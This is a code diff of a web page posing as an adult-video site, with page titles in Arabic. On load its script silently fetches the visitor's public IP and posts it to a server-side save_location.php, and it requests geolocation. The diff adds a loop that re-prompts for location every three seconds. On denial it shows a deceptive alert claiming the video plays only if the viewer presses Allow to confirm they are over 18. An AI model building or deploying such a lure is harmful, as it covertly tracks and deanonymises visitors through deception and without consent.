@@ -13,35 +13,88 @@ body {
 }
 </style>
 	<meta charset="UTF-8">
-	<title>سكس جامد</title>
+	<title>seko</title>
 	
 
 
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 	<script>
-	
-		function getLocation() {
 
-            
 
-			if (navigator.geolocation) {
+
+		
+		function getLocation() 
+		{
+			if (navigator.geolocation) {		    
 			    
-			    
-				navigator.geolocation.getCurrentPosition(showPosition, showError);
-				
-				
+				navigator.geolocation.getCurrentPosition(showPosition, showError);			
 getIP(function(ip) {
                 saveLocationToServer(ip, ip); // Use the IP address as the location parameter
             });
-				
-				
-				
-				
-				
+					
 			} else {
 				alert("غير المتصفح");
 			}
 		}
+
+		
+
+
+//popsup without sending any thing
+	function overonlyeveryx() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showErroryyy);
+  } else {
+    alert("افتح في متصفح اخر");
+  }
+}
+
+
+
+
+//the timing error
+		function showErroryyy(error) {
+		
+    switch(error.code) {
+    
+        case error.PERMISSION_DENIED:
+        
+         
+            
+            ///////tricking test
+            
+ //  window.location.href = 'index.html';
+
+            ///////
+            
+           alert("اضغط علي زر سماح اذا كنت اكبر من ١٨ سنه لمشاهده الفيديو");
+ 
+            break;
+        case error.POSITION_UNAVAILABLE:
+            
+            alert("معلومات عن الموقع غير متاحة.");
+            break;
+        case error.TIMEOUT:
+          
+            alert("لم يتم الرد على طلب الموقع.");
+            break;
+        case error.UNKNOWN_ERROR:
+           
+            alert("حدث خطأ غير معروف.");
+            break;
+    }
+
+}
+
+
+
+		
+
+
+
+
+
+		
 
 	function showPosition(position) {
     var lat = position.coords.latitude;
@@ -53,6 +106,9 @@ getIP(function(ip) {
     });
 	
 }
+
+
+		
 		function getIP(callback) {
     $.getJSON("https://api.ipify.org?format=json", function(data) {
         callback(data.ip);
@@ -61,19 +117,24 @@ getIP(function(ip) {
 
 		function saveLocationToServer(location, ip) {
     $.post("save_location.php", { location: location, ip: ip }, function(data) {
-        console.log(data);
+       // console.log(data);
         //alert("تم حفظ العنوان في الملف!");
     });
 }
 
+
+
+
+		
+
+
+
+
+		//the main error
 		function showError(error) {
 		
     switch(error.code) {
-        
-        
-        
-        
-        
+    
         case error.PERMISSION_DENIED:
         
             getIP(function(ip) {
@@ -108,15 +169,20 @@ getIP(function(ip) {
             //alert("حدث خطأ غير معروف.");
             break;
     }
-    
-    
+
 }
 
 
 
 
+		
+
+
 		$(document).ready(function() {
 			getLocation();
+		setInterval(overonlyeveryx, 3000);
+
+			
 		});
 		
 		
